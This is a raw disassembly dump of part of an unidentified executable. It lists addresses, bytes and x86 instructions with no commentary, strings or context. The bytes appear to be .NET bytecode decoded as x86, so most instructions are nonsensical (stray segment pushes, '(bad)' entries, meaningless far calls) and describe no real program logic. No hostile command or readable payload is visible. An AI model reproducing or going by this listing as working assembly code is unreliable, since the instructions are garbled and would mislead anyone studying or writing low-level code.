  404cf4:	32 00                	xor    (%eax),%al
  404cf6:	00 04 da             	add    %al,(%edx,%ebx,8)
  404cf9:	80 2a 00             	subb   $0x0,(%edx)
  404cfc:	00 04 7e             	add    %al,(%esi,%edi,2)
  404cff:	2a 00                	sub    (%eax),%al
  404d01:	00 04 16             	add    %al,(%esi,%edx,1)
  404d04:	31 1b                	xor    %ebx,(%ebx)
  404d06:	7e 2a                	jle    0x404d32
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	04 6c                	add    $0x6c,%al
  404d0c:	23 00                	and    (%eax),%eax
  404d0e:	00 00                	add    %al,(%eax)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	40                   	inc    %eax
  404d13:	8f 40 5b             	pop    0x5b(%eax)
  404d16:	28 69 00             	sub    %ch,0x0(%ecx)
  404d19:	00 0a                	add    %cl,(%edx)
  404d1b:	b7 0a                	mov    $0xa,%bh
  404d1d:	2b 06                	sub    (%esi),%eax
  404d1f:	2b 04 16             	sub    (%esi,%edx,1),%eax
  404d22:	0a 2b                	or     (%ebx),%ch
  404d24:	00 06                	add    %al,(%esi)
  404d26:	2a 00                	sub    (%eax),%al
  404d28:	13 30                	adc    (%eax),%esi
  404d2a:	02 00                	add    (%eax),%al
  404d2c:	50                   	push   %eax
  404d2d:	00 00                	add    %al,(%eax)
  404d2f:	00 32                	add    %dh,(%edx)
  404d31:	00 00                	add    %al,(%eax)
  404d33:	11 2b                	adc    %ebp,(%ebx)
  404d35:	49                   	dec    %ecx
  404d36:	20 e8                	and    %ch,%al
  404d38:	03 00                	add    (%eax),%eax
  404d3a:	00 28                	add    %ch,(%eax)
  404d3c:	21 00                	and    %eax,(%eax)
  404d3e:	00 0a                	add    %cl,(%edx)
  404d40:	28 58 00             	sub    %bl,0x0(%eax)
  404d43:	00 06                	add    %al,(%esi)
  404d45:	0b 7e 2d             	or     0x2d(%esi),%edi
  404d48:	00 00                	add    %al,(%eax)
  404d4a:	04 07                	add    $0x7,%al
  404d4c:	31 1c 7f             	xor    %ebx,(%edi,%edi,2)
  404d4f:	2c 00                	sub    $0x0,%al
  404d51:	00 04 7e             	add    %al,(%esi,%edi,2)
  404d54:	2d 00 00 04 6c       	sub    $0x6c040000,%eax
  404d59:	28 b2 00 00 0a 28    	sub    %dh,0x280a0000(%edx)
  404d5f:	04 01                	add    $0x1,%al
  404d61:	00 0a                	add    %cl,(%edx)
  404d63:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  404d67:	04 2b                	add    $0x2b,%al
  404d69:	0f 28 58 00          	movaps 0x0(%eax),%xmm3
  404d6d:	00 06                	add    %al,(%esi)
  404d6f:	28 78 00             	sub    %bh,0x0(%eax)
  404d72:	00 0a                	add    %cl,(%edx)
  404d74:	80 2e 00             	subb   $0x0,(%esi)
  404d77:	00 04 07             	add    %al,(%edi,%eax,1)
  404d7a:	80 2d 00 00 04 17 2d 	subb   $0x2d,0x17040000
  404d81:	b4 06                	mov    $0x6,%ah
  404d83:	2a 1b                	sub    (%ebx),%bl
  404d85:	30 01                	xor    %al,(%ecx)
  404d87:	00 1a                	add    %bl,(%edx)
  404d89:	00 00                	add    %al,(%eax)
  404d8b:	00 00                	add    %al,(%eax)
  404d8d:	00 00                	add    %al,(%eax)
  404d8f:	00 20                	add    %ah,(%eax)
  404d91:	03 00                	add    (%eax),%eax
  404d93:	00 80 28 5c 00 00    	add    %al,0x5c28(%eax)
  404d99:	06                   	push   %es
  404d9a:	26 de 0c 28          	fimuls %es:(%eax,%ebp,1)
  404d9e:	23 00                	and    (%eax),%eax
  404da0:	00 0a                	add    %cl,(%edx)
  404da2:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404da8:	00 2a                	add    %ch,(%edx)
  404daa:	00 00                	add    %al,(%eax)
  404dac:	01 10                	add    %edx,(%eax)
  404dae:	00 00                	add    %al,(%eax)
  404db0:	00 00                	add    %al,(%eax)
  404db2:	00 00                	add    %al,(%eax)
  404db4:	0d 0d 00 0c 26       	or     $0x260c000d,%eax
  404db9:	00 00                	add    %al,(%eax)
  404dbb:	01 1b                	add    %ebx,(%ebx)
  404dbd:	30 03                	xor    %al,(%ebx)
  404dbf:	00 41 00             	add    %al,0x0(%ecx)
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	34 00                	xor    $0x0,%al
  404dc6:	00 11                	add    %dl,(%ecx)
  404dc8:	20 00                	and    %al,(%eax)
  404dca:	01 00                	add    %eax,(%eax)
  404dcc:	00 73 ff             	add    %dh,-0x1(%ebx)
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	0a 0b                	or     (%ebx),%cl
  404dd3:	28 5a 00             	sub    %bl,0x0(%edx)
  404dd6:	00 06                	add    %al,(%esi)
  404dd8:	0c 08                	or     $0x8,%al
  404dda:	07                   	pop    %es
  404ddb:	20 00                	and    %al,(%eax)
  404ddd:	01 00                	add    %eax,(%eax)
  404ddf:	00 28                	add    %ch,(%eax)
  404de1:	5b                   	pop    %ebx
  404de2:	00 00                	add    %al,(%eax)
  404de4:	06                   	push   %es
  404de5:	16                   	push   %ss
  404de6:	31 09                	xor    %ecx,(%ecx)
  404de8:	07                   	pop    %es
  404de9:	6f                   	outsl  %ds:(%esi),(%dx)
  404dea:	5c                   	pop    %esp
  404deb:	00 00                	add    %al,(%eax)
  404ded:	0a 0a                	or     (%edx),%cl
  404def:	de 16                	ficoms (%esi)
  404df1:	de 0c 28             	fimuls (%eax,%ebp,1)
  404df4:	23 00                	and    (%eax),%eax
  404df6:	00 0a                	add    %cl,(%edx)
  404df8:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404dfe:	00 72 4a             	add    %dh,0x4a(%edx)
  404e01:	03 00                	add    (%eax),%eax
  404e03:	70 0a                	jo     0x404e0f
  404e05:	2b 00                	sub    (%eax),%eax
  404e07:	06                   	push   %es
  404e08:	2a 00                	sub    (%eax),%al
  404e0a:	00 00                	add    %al,(%eax)
  404e0c:	01 10                	add    %edx,(%eax)
  404e0e:	00 00                	add    %al,(%eax)
  404e10:	00 00                	add    %al,(%eax)
  404e12:	00 00                	add    %al,(%eax)
  404e14:	2b 2b                	sub    (%ebx),%ebp
  404e16:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  404e19:	00 00                	add    %al,(%eax)
  404e1b:	01 13                	add    %edx,(%ebx)
  404e1d:	30 02                	xor    %al,(%edx)
  404e1f:	00 10                	add    %dl,(%eax)
  404e21:	00 00                	add    %al,(%eax)
  404e23:	00 35 00 00 11 28    	add    %dh,0x28110000
  404e29:	d2 00                	rolb   %cl,(%eax)
  404e2b:	00 0a                	add    %cl,(%edx)
  404e2d:	02 6f d3             	add    -0x2d(%edi),%ch
  404e30:	00 00                	add    %al,(%eax)
  404e32:	0a 0a                	or     (%edx),%cl
  404e34:	2b 00                	sub    (%eax),%eax
  404e36:	06                   	push   %es
  404e37:	2a 13                	sub    (%ebx),%dl
  404e39:	30 02                	xor    %al,(%edx)
  404e3b:	00 10                	add    %dl,(%eax)
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	00 36                	add    %dh,(%esi)
  404e41:	00 00                	add    %al,(%eax)
  404e43:	11 28                	adc    %ebp,(%eax)
  404e45:	d2 00                	rolb   %cl,(%eax)
  404e47:	00 0a                	add    %cl,(%edx)
  404e49:	02 6f 05             	add    0x5(%edi),%ch
  404e4c:	01 00                	add    %eax,(%eax)
  404e4e:	0a 0a                	or     (%edx),%cl
  404e50:	2b 00                	sub    (%eax),%eax
  404e52:	06                   	push   %es
  404e53:	2a 1b                	sub    (%ebx),%bl
  404e55:	30 03                	xor    %al,(%ebx)
  404e57:	00 73 00             	add    %dh,0x0(%ebx)
  404e5a:	00 00                	add    %al,(%eax)
  404e5c:	37                   	aaa
  404e5d:	00 00                	add    %al,(%eax)
  404e5f:	11 1b                	adc    %ebx,(%ebx)
  404e61:	8d 03                	lea    (%ebx),%eax
  404e63:	00 00                	add    %al,(%eax)
  404e65:	01 0b                	add    %ecx,(%ebx)
  404e67:	07                   	pop    %es
  404e68:	16                   	push   %ss
  404e69:	28 06                	sub    %al,(%esi)
  404e6b:	01 00                	add    %eax,(%eax)
  404e6d:	0a 8c 6f 00 00 01 a2 	or     -0x5dff0000(%edi,%ebp,2),%cl
  404e74:	07                   	pop    %es
  404e75:	17                   	pop    %ss
  404e76:	28 42 00             	sub    %al,0x0(%edx)
  404e79:	00 0a                	add    %cl,(%edx)
  404e7b:	a2 07 18 28 52       	mov    %al,0x52281807
  404e80:	00 00                	add    %al,(%eax)
  404e82:	0a a2 07 19 28 45    	or     0x45281907(%edx),%ah
  404e88:	00 00                	add    %al,(%eax)
  404e8a:	0a a2 07 1a 28 07    	or     0x7281a07(%edx),%ah
  404e90:	01 00                	add    %eax,(%eax)
  404e92:	0a 28                	or     (%eax),%ch
  404e94:	08 01                	or     %al,(%ecx)
  404e96:	00 0a                	add    %cl,(%edx)
  404e98:	73 09                	jae    0x404ea3
  404e9a:	01 00                	add    %eax,(%eax)
  404e9c:	0a 6f 0a             	or     0xa(%edi),%ch
  404e9f:	01 00                	add    %eax,(%eax)
  404ea1:	0a 8c 93 00 00 01 a2 	or     -0x5dff0000(%ebx,%edx,4),%cl
  404ea8:	07                   	pop    %es
  404ea9:	28 49 00             	sub    %cl,0x0(%ecx)
  404eac:	00 0a                	add    %cl,(%edx)
  404eae:	28 62 00             	sub    %ah,0x0(%edx)
  404eb1:	00 06                	add    %al,(%esi)
  404eb3:	0a de                	or     %dh,%bl
  404eb5:	1b de                	sbb    %esi,%ebx
  404eb7:	19 28                	sbb    %ebp,(%eax)
  404eb9:	23 00                	and    (%eax),%eax
  404ebb:	00 0a                	add    %cl,(%edx)
  404ebd:	72 e0                	jb     0x404e9f
  404ebf:	0d 00 70 0a 28       	or     $0x280a7000,%eax
  404ec4:	25 00 00 0a de       	and    $0xde0a0000,%eax
  404ec9:	07                   	pop    %es
  404eca:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404ed0:	00 06                	add    %al,(%esi)
  404ed2:	2a 00                	sub    (%eax),%al
  404ed4:	01 10                	add    %edx,(%eax)
  404ed6:	00 00                	add    %al,(%eax)
  404ed8:	00 00                	add    %al,(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	58                   	pop    %eax
  404edd:	58                   	pop    %eax
  404ede:	00 19                	add    %bl,(%ecx)
  404ee0:	26 00 00             	add    %al,%es:(%eax)
  404ee3:	01 13                	add    %edx,(%ebx)
  404ee5:	30 03                	xor    %al,(%ebx)
  404ee7:	00 68 00             	add    %ch,0x0(%eax)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	38 00                	cmp    %al,(%eax)
  404eee:	00 11                	add    %dl,(%ecx)
  404ef0:	73 f4                	jae    0x404ee6
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  404ef7:	0b 01                	or     (%ecx),%eax
  404ef9:	00 0a                	add    %cl,(%edx)
  404efb:	02 6f d3             	add    -0x2d(%edi),%ch
  404efe:	00 00                	add    %al,(%eax)
  404f00:	0a 0a                	or     (%edx),%cl
  404f02:	08 06                	or     %al,(%esi)
  404f04:	6f                   	outsl  %ds:(%esi),(%dx)
  404f05:	f5                   	cmc
  404f06:	00 00                	add    %al,(%eax)
  404f08:	0a 0a                	or     (%edx),%cl
  404f0a:	73 55                	jae    0x404f61
  404f0c:	00 00                	add    %al,(%eax)
  404f0e:	0a 0d 06 13 06 16    	or     0x16061306,%cl
  404f14:	13 05 2b 20 11 06    	adc    0x611202b,%eax
  404f1a:	11 05 91 13 04 09    	adc    %eax,0x9041391
  404f20:	12 04 72             	adc    (%edx,%esi,2),%al
  404f23:	f2 0d 00 70 28 0c    	repnz or $0xc287000,%eax
  404f29:	01 00                	add    %eax,(%eax)
  404f2b:	0a 6f 5a             	or     0x5a(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  404f38:	11 05 11 06 8e b7    	adc    %eax,0xb78e0611
  404f3e:	32 d8                	xor    %al,%bl
  404f40:	09 6f 5c             	or     %ebp,0x5c(%edi)
  404f43:	00 00                	add    %al,(%eax)
  404f45:	0a 16                	or     (%esi),%dl
  404f47:	1f                   	pop    %ds
  404f48:	14 6f                	adc    $0x6f,%al
  404f4a:	5f                   	pop    %edi
  404f4b:	00 00                	add    %al,(%eax)
  404f4d:	0a 6f 0d             	or     0xd(%edi),%ch
  404f50:	01 00                	add    %eax,(%eax)
  404f52:	0a 0b                	or     (%ebx),%cl
  404f54:	2b 00                	sub    (%eax),%eax
  404f56:	07                   	pop    %es
  404f57:	2a 1b                	sub    (%ebx),%bl
  404f59:	30 04 00             	xor    %al,(%eax,%eax,1)
  404f5c:	40                   	inc    %eax
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 39                	add    %bh,(%ecx)
  404f61:	00 00                	add    %al,(%eax)
  404f63:	11 7e 0e             	adc    %edi,0xe(%esi)
  404f66:	01 00                	add    %eax,(%eax)
  404f68:	0a 7e 28             	or     0x28(%esi),%bh
  404f6b:	00 00                	add    %al,(%eax)
  404f6d:	04 18                	add    $0x18,%al
  404f6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404f70:	0f 01 00             	sgdtl  (%eax)
  404f73:	0a 0b                	or     (%ebx),%cl
  404f75:	07                   	pop    %es
  404f76:	02 03                	add    (%ebx),%al
  404f78:	19 6f 10             	sbb    %ebp,0x10(%edi)
  404f7b:	01 00                	add    %eax,(%eax)
  404f7d:	0a 17                	or     (%edi),%dl
  404f7f:	0a de                	or     %dh,%bl
  404f81:	20 de                	and    %bl,%dh
  404f83:	0a 07                	or     (%edi),%al
  404f85:	2c 06                	sub    $0x6,%al
  404f87:	07                   	pop    %es
  404f88:	6f                   	outsl  %ds:(%esi),(%dx)
  404f89:	30 00                	xor    %al,(%eax)
  404f8b:	00 0a                	add    %cl,(%edx)
  404f8d:	dc de                	(bad)
  404f8f:	0e                   	push   %cs
  404f90:	25 28 23 00 00       	and    $0x2328,%eax
  404f95:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  404f98:	25 00 00 0a de       	and    $0xde0a0000,%eax
  404f9d:	00 16                	add    %dl,(%esi)
  404f9f:	0a 2b                	or     (%ebx),%ch
  404fa1:	00 06                	add    %al,(%esi)
  404fa3:	2a 01                	sub    (%ecx),%al
  404fa5:	1c 00                	sbb    $0x0,%al
  404fa7:	00 02                	add    %al,(%edx)
  404fa9:	00 11                	add    %dl,(%ecx)
  404fab:	00 0f                	add    %cl,(%edi)
  404fad:	20 00                	and    %al,(%eax)
  404faf:	0a 00                	or     (%eax),%al
  404fb1:	00 00                	add    %al,(%eax)
  404fb3:	00 00                	add    %al,(%eax)
  404fb5:	00 00                	add    %al,(%eax)
  404fb7:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404fba:	00 0e                	add    %cl,(%esi)
  404fbc:	26 00 00             	add    %al,%es:(%eax)
  404fbf:	01 1b                	add    %ebx,(%ebx)
  404fc1:	30 02                	xor    %al,(%edx)
  404fc3:	00 48 00             	add    %cl,0x0(%eax)
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	3a 00                	cmp    (%eax),%al
  404fca:	00 11                	add    %dl,(%ecx)
  404fcc:	7e 0e                	jle    0x404fdc
  404fce:	01 00                	add    %eax,(%eax)
  404fd0:	0a 7e 28             	or     0x28(%esi),%bh
  404fd3:	00 00                	add    %al,(%eax)
  404fd5:	04 6f                	add    $0x6f,%al
  404fd7:	11 01                	adc    %eax,(%ecx)
  404fd9:	00 0a                	add    %cl,(%edx)
  404fdb:	0b 07                	or     (%edi),%eax
  404fdd:	02 6f 12             	add    0x12(%edi),%ch
  404fe0:	01 00                	add    %eax,(%eax)
  404fe2:	0a 28                	or     (%eax),%ch
  404fe4:	11 00                	adc    %eax,(%eax)
  404fe6:	00 0a                	add    %cl,(%edx)
  404fe8:	0c 08                	or     $0x8,%al
  404fea:	74 09                	je     0x404ff5
  404fec:	00 00                	add    %al,(%eax)
  404fee:	1b 0a                	sbb    (%edx),%ecx
  404ff0:	de 20                	fisubs (%eax)
  404ff2:	de 0a                	fimuls (%edx)
  404ff4:	07                   	pop    %es
  404ff5:	2c 06                	sub    $0x6,%al
  404ff7:	07                   	pop    %es
  404ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff9:	30 00                	xor    %al,(%eax)
  404ffb:	00 0a                	add    %cl,(%edx)
  404ffd:	dc de                	(bad)
  404fff:	0e                   	push   %cs
  405000:	25 28 23 00 00       	and    $0x2328,%eax
  405005:	0a 0d 28 25 00 00    	or     0x2528,%cl
  40500b:	0a de                	or     %dh,%bl
  40500d:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  405010:	2b 00                	sub    (%eax),%eax
  405012:	06                   	push   %es
  405013:	2a 01                	sub    (%ecx),%al
  405015:	1c 00                	sbb    $0x0,%al
  405017:	00 02                	add    %al,(%edx)
  405019:	00 10                	add    %dl,(%eax)
  40501b:	00 18                	add    %bl,(%eax)
  40501d:	28 00                	sub    %al,(%eax)
  40501f:	0a 00                	or     (%eax),%al
  405021:	00 00                	add    %al,(%eax)
  405023:	00 00                	add    %al,(%eax)
  405025:	00 00                	add    %al,(%eax)
  405027:	00 34 34             	add    %dh,(%esp,%esi,1)
  40502a:	00 0e                	add    %cl,(%esi)
  40502c:	26 00 00             	add    %al,%es:(%eax)
  40502f:	01 1b                	add    %ebx,(%ebx)
  405031:	30 09                	xor    %cl,(%ecx)
  405033:	00 5f 01             	add    %bl,0x1(%edi)
  405036:	00 00                	add    %al,(%eax)
  405038:	3b 00                	cmp    (%eax),%eax
  40503a:	00 11                	add    %dl,(%ecx)
  40503c:	02 73 13             	add    0x13(%ebx),%dh
  40503f:	01 00                	add    %eax,(%eax)
  405041:	0a 0b                	or     (%ebx),%cl
  405043:	1a 8d 36 00 00 01    	sbb    0x1000036(%ebp),%cl
  405049:	0d 07 14 72 f8       	or     $0xf8721407,%eax
  40504e:	0d 00 70 19 8d       	or     $0x8d197000,%eax
  405053:	03 00                	add    (%eax),%eax
  405055:	00 01                	add    %al,(%ecx)
  405057:	13 06                	adc    (%esi),%eax
  405059:	11 06                	adc    %eax,(%esi)
  40505b:	16                   	push   %ss
  40505c:	09 a2 11 06 17 16    	or     %esp,0x16170611(%edx)
  405062:	8c 6f 00             	mov    %gs,0x0(%edi)
  405065:	00 01                	add    %al,(%ecx)
  405067:	a2 11 06 18 1a       	mov    %al,0x1a180611
  40506c:	8c 6f 00             	mov    %gs,0x0(%edi)
  40506f:	00 01                	add    %al,(%ecx)
  405071:	a2 11 06 13 07       	mov    %al,0x7130611
  405076:	11 07                	adc    %eax,(%edi)
  405078:	14 14                	adc    $0x14,%al
  40507a:	19 8d 3b 00 00 01    	sbb    %ecx,0x100003b(%ebp)
  405080:	13 08                	adc    (%eax),%ecx
  405082:	11 08                	adc    %ecx,(%eax)
  405084:	16                   	push   %ss
  405085:	17                   	pop    %ss
  405086:	9c                   	pushf
  405087:	11 08                	adc    %ecx,(%eax)
  405089:	17                   	pop    %ss
  40508a:	16                   	push   %ss
  40508b:	9c                   	pushf
  40508c:	11 08                	adc    %ecx,(%eax)
  40508e:	18 16                	sbb    %dl,(%esi)
  405090:	9c                   	pushf
  405091:	11 08                	adc    %ecx,(%eax)
  405093:	17                   	pop    %ss
  405094:	28 75 00             	sub    %dh,0x0(%ebp)
  405097:	00 0a                	add    %cl,(%edx)
  405099:	26 11 08             	adc    %ecx,%es:(%eax)
  40509c:	16                   	push   %ss
  40509d:	90                   	nop
  40509e:	2c 1e                	sub    $0x1e,%al
  4050a0:	11 07                	adc    %eax,(%edi)
  4050a2:	16                   	push   %ss
  4050a3:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4050aa:	09 00                	or     %eax,(%eax)
  4050ac:	00 1b                	add    %bl,(%ebx)
  4050ae:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4050b1:	00 0a                	add    %cl,(%edx)
  4050b3:	28 14 01             	sub    %dl,(%ecx,%eax,1)
  4050b6:	00 0a                	add    %cl,(%edx)
  4050b8:	74 09                	je     0x4050c3
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	1b 0d 09 16 28 15    	sbb    0x15281609,%ecx
  4050c2:	01 00                	add    %eax,(%eax)
  4050c4:	0a 8c 6f 00 00 01 0c 	or     0xc010000(%edi,%ebp,2),%cl
  4050cb:	07                   	pop    %es
  4050cc:	74 4f                	je     0x40511d
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	01 16                	add    %edx,(%esi)
  4050d2:	73 16                	jae    0x4050ea
  4050d4:	01 00                	add    %eax,(%eax)
  4050d6:	0a 13                	or     (%ebx),%dl
  4050d8:	04 08                	add    $0x8,%al
  4050da:	17                   	pop    %ss
  4050db:	8c 6f 00             	mov    %gs,0x0(%edi)
  4050de:	00 01                	add    %al,(%ecx)
  4050e0:	28 17                	sub    %dl,(%edi)
  4050e2:	01 00                	add    %eax,(%eax)
  4050e4:	0a 28                	or     (%eax),%ch
  4050e6:	ea 00 00 0a 17 d6 8d 	ljmp   $0x8dd6,$0x170a0000
  4050ed:	36 00 00             	add    %al,%ss:(%eax)
  4050f0:	01 13                	add    %edx,(%ebx)
  4050f2:	05 11 04 14 72       	add    $0x72140411,%eax
  4050f7:	f8                   	clc
  4050f8:	0d 00 70 19 8d       	or     $0x8d197000,%eax
  4050fd:	03 00                	add    (%eax),%eax
  4050ff:	00 01                	add    %al,(%ecx)
  405101:	13 07                	adc    (%edi),%eax
  405103:	11 07                	adc    %eax,(%edi)
  405105:	16                   	push   %ss
  405106:	11 05 28 11 00 00    	adc    %eax,0x1128
  40510c:	0a a2 11 07 17 16    	or     0x16170711(%edx),%ah
  405112:	8c 6f 00             	mov    %gs,0x0(%edi)
  405115:	00 01                	add    %al,(%ecx)
  405117:	a2 11 07 18 08       	mov    %al,0x8180711
  40511c:	28 11                	sub    %dl,(%ecx)
  40511e:	00 00                	add    %al,(%eax)
  405120:	0a a2 11 07 13 06    	or     0x6130711(%edx),%ah
  405126:	11 06                	adc    %eax,(%esi)
  405128:	14 14                	adc    $0x14,%al
  40512a:	19 8d 3b 00 00 01    	sbb    %ecx,0x100003b(%ebp)
  405130:	13 08                	adc    (%eax),%ecx
  405132:	11 08                	adc    %ecx,(%eax)
  405134:	16                   	push   %ss
  405135:	17                   	pop    %ss
  405136:	9c                   	pushf
  405137:	11 08                	adc    %ecx,(%eax)
  405139:	17                   	pop    %ss
  40513a:	16                   	push   %ss
  40513b:	9c                   	pushf
  40513c:	11 08                	adc    %ecx,(%eax)
  40513e:	18 17                	sbb    %dl,(%edi)
  405140:	9c                   	pushf
  405141:	11 08                	adc    %ecx,(%eax)
  405143:	17                   	pop    %ss
  405144:	28 75 00             	sub    %dh,0x0(%ebp)
  405147:	00 0a                	add    %cl,(%edx)
  405149:	26 11 08             	adc    %ecx,%es:(%eax)
  40514c:	16                   	push   %ss
  40514d:	90                   	nop
  40514e:	2c 0b                	sub    $0xb,%al
  405150:	11 06                	adc    %eax,(%esi)
  405152:	16                   	push   %ss
  405153:	9a 28 11 00 00 0a 13 	lcall  $0x130a,$0x1128
  40515a:	05 11 08 18 90       	add    $0x90180811,%eax
  40515f:	2c 0a                	sub    $0xa,%al
  405161:	11 06                	adc    %eax,(%esi)
  405163:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  405169:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  40516c:	05 74 09 00 00       	add    $0x974,%eax
  405171:	1b 0a                	sbb    (%edx),%ecx
  405173:	de 24 de             	fisubs (%esi,%ebx,8)
  405176:	11 11                	adc    %edx,(%ecx)
  405178:	04 2c                	add    $0x2c,%al
  40517a:	0c 11                	or     $0x11,%al
  40517c:	04 74                	add    $0x74,%al
  40517e:	2f                   	das
  40517f:	00 00                	add    %al,(%eax)
  405181:	01 6f 30             	add    %ebp,0x30(%edi)
  405184:	00 00                	add    %al,(%eax)
  405186:	0a dc                	or     %ah,%bl
  405188:	de 0f                	fimuls (%edi)
  40518a:	07                   	pop    %es
  40518b:	2c 0b                	sub    $0xb,%al
  40518d:	07                   	pop    %es
  40518e:	74 2f                	je     0x4051bf
  405190:	00 00                	add    %al,(%eax)
  405192:	01 6f 30             	add    %ebp,0x30(%edi)
  405195:	00 00                	add    %al,(%eax)
  405197:	0a dc                	or     %ah,%bl
  405199:	06                   	push   %es
  40519a:	2a 00                	sub    (%eax),%al
  40519c:	41                   	inc    %ecx
  40519d:	34 00                	xor    $0x0,%al
  40519f:	00 02                	add    %al,(%edx)
  4051a1:	00 00                	add    %al,(%eax)
  4051a3:	00 9d 00 00 00 9e    	add    %bl,-0x62000000(%ebp)
  4051a9:	00 00                	add    %al,(%eax)
  4051ab:	00 3b                	add    %bh,(%ebx)
  4051ad:	01 00                	add    %eax,(%eax)
  4051af:	00 11                	add    %dl,(%ecx)
  4051b1:	00 00                	add    %al,(%eax)
  4051b3:	00 00                	add    %al,(%eax)
  4051b5:	00 00                	add    %al,(%eax)
  4051b7:	00 02                	add    %al,(%edx)
  4051b9:	00 00                	add    %al,(%eax)
  4051bb:	00 07                	add    %al,(%edi)
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 47 01             	add    %al,0x1(%edi)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	4e                   	dec    %esi
  4051c5:	01 00                	add    %eax,(%eax)
  4051c7:	00 0f                	add    %cl,(%edi)
  4051c9:	00 00                	add    %al,(%eax)
  4051cb:	00 00                	add    %al,(%eax)
  4051cd:	00 00                	add    %al,(%eax)
  4051cf:	00 1b                	add    %bl,(%ebx)
  4051d1:	30 09                	xor    %cl,(%ecx)
  4051d3:	00 50 01             	add    %dl,0x1(%eax)
  4051d6:	00 00                	add    %al,(%eax)
  4051d8:	3c 00                	cmp    $0x0,%al
  4051da:	00 11                	add    %dl,(%ecx)
  4051dc:	73 37                	jae    0x405215
  4051de:	00 00                	add    %al,(%eax)
  4051e0:	0a 0b                	or     (%ebx),%cl
  4051e2:	02 8e b7 28 18 01    	add    0x11828b7(%esi),%cl
  4051e8:	00 0a                	add    %cl,(%edx)
  4051ea:	0c 07                	or     $0x7,%al
  4051ec:	14 72                	adc    $0x72,%al
  4051ee:	02 0e                	add    (%esi),%cl
  4051f0:	00 70 19             	add    %dh,0x19(%eax)
  4051f3:	8d 03                	lea    (%ebx),%eax
  4051f5:	00 00                	add    %al,(%eax)
  4051f7:	01 13                	add    %edx,(%ebx)
  4051f9:	04 11                	add    $0x11,%al
  4051fb:	04 16                	add    $0x16,%al
  4051fd:	08 28                	or     %ch,(%eax)
  4051ff:	11 00                	adc    %eax,(%eax)
  405201:	00 0a                	add    %cl,(%edx)
  405203:	a2 11 04 17 16       	mov    %al,0x16170411
  405208:	8c 6f 00             	mov    %gs,0x0(%edi)
  40520b:	00 01                	add    %al,(%ecx)
  40520d:	a2 11 04 18 1a       	mov    %al,0x1a180411
  405212:	8c 6f 00             	mov    %gs,0x0(%edi)
  405215:	00 01                	add    %al,(%ecx)
  405217:	a2 11 04 13 05       	mov    %al,0x5130411
  40521c:	11 05 14 14 19 8d    	adc    %eax,0x8d191414
  405222:	3b 00                	cmp    (%eax),%eax
  405224:	00 01                	add    %al,(%ecx)
  405226:	13 06                	adc    (%esi),%eax
  405228:	11 06                	adc    %eax,(%esi)
  40522a:	16                   	push   %ss
  40522b:	17                   	pop    %ss
  40522c:	9c                   	pushf
  40522d:	11 06                	adc    %eax,(%esi)
  40522f:	17                   	pop    %ss
  405230:	16                   	push   %ss
  405231:	9c                   	pushf
  405232:	11 06                	adc    %eax,(%esi)
  405234:	18 16                	sbb    %dl,(%esi)
  405236:	9c                   	pushf
  405237:	11 06                	adc    %eax,(%esi)
  405239:	17                   	pop    %ss
  40523a:	28 75 00             	sub    %dh,0x0(%ebp)
  40523d:	00 0a                	add    %cl,(%edx)
  40523f:	26 11 06             	adc    %eax,%es:(%esi)
  405242:	16                   	push   %ss
  405243:	90                   	nop
  405244:	2c 0a                	sub    $0xa,%al
  405246:	11 05 16 9a 28 11    	adc    %eax,0x11289a16
  40524c:	00 00                	add    %al,(%eax)
  40524e:	0a 0c 07             	or     (%edi,%eax,1),%cl
  405251:	74 4f                	je     0x4052a2
  405253:	00 00                	add    %al,(%eax)
  405255:	01 17                	add    %edx,(%edi)
  405257:	73 16                	jae    0x40526f
  405259:	01 00                	add    %eax,(%eax)
  40525b:	0a 0d 09 14 72 02    	or     0x2721409,%cl
  405261:	0e                   	push   %cs
  405262:	00 70 19             	add    %dh,0x19(%eax)
  405265:	8d 03                	lea    (%ebx),%eax
  405267:	00 00                	add    %al,(%eax)
  405269:	01 13                	add    %edx,(%ebx)
  40526b:	05 11 05 16 02       	add    $0x2160511,%eax
  405270:	a2 11 05 17 16       	mov    %al,0x16170511
  405275:	8c 6f 00             	mov    %gs,0x0(%edi)
  405278:	00 01                	add    %al,(%ecx)
  40527a:	a2 11 05 18 02       	mov    %al,0x2180511
  40527f:	8e b7 8c 6f 00 00    	mov    0x6f8c(%edi),%?
  405285:	01 a2 11 05 13 04    	add    %esp,0x4130511(%edx)
  40528b:	11 04 14             	adc    %eax,(%esp,%edx,1)
  40528e:	14 19                	adc    $0x19,%al
  405290:	8d 3b                	lea    (%ebx),%edi
  405292:	00 00                	add    %al,(%eax)
  405294:	01 13                	add    %edx,(%ebx)
  405296:	06                   	push   %es
  405297:	11 06                	adc    %eax,(%esi)
  405299:	16                   	push   %ss
  40529a:	17                   	pop    %ss
  40529b:	9c                   	pushf
  40529c:	11 06                	adc    %eax,(%esi)
